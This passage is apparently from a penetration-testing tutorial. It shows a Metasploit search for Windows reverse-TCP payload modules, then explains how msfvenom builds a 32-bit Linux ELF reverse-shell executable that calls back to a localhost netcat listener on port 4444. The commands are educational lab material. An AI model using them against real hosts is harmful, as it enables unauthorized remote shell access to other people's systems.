# # Searching for Payloads

```
msf > search arch:x86 platform:windows reverse_tcp
```

# ## Matching Modules

| Name | Disclosure Date | Rank | Check | Description |
| --- | --- | --- | --- | --- |
| payload/windows/dllinject/reverse_tcp | | normal | No | Reflective DLL Injection, Reverse TCP Stager |
| payload/windows/dllinject/reverse_tcp_allports | | normal | No | Reflective DLL Injection, Reverse All-Port TCP Stager |
| payload/windows/dllinject/reverse_tcp_dns | | normal | No | Reflective DLL Injection, Reverse TCP Stager (DNS) |
| payload/windows/dllinject/reverse_tcp_rc4 | | normal | No | Reflective DLL Injection, Reverse TCP Stager (RC4 Stage Encryption, Metasm) |
| payload/windows/dllinject/reverse_tcp_rc4_dns | | normal | No | Reflective DLL Injection, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm) |
| payload/windows/dllinject/reverse_tcp_uuid | | normal | No | Reflective DLL Injection, Reverse TCP Stager with UUID Support |

When we create the executable we are going to use, we need to use msfvenom. This will take one of the payload scripts, written in Ruby, and compile it to an output file that we specify. In the following listing, you can see the use of msfvenom to create an Executable and Linkable Format (ELF) file. This is the executable format on Linux systems, like the portable executable (PE) format is for Windows. The command line indicates that we are creating an executable for an x86, meaning 32-bit system, running Linux. The payload is a reverse shell over a TCP connection on port 4444. The system we are going to be connecting to is located at 127.0.0.1, since it's just going to be used to connect to a netcat listener on the localhost. The output is called payload, though it could be called anything. This is the name of the executable that we get. At the end of the output, you can see that the file is an ELF executable that is 32-bit. In order to run it on a Linux system, though, you need to set the executable bit.

# ## Using msfvenom

```
kilroy:~$ msfvenom -a x86 -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 \
lport=4444 -f elf --platform=linux -o payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
Final size of elf file: 152 bytes
Saved as: payload
```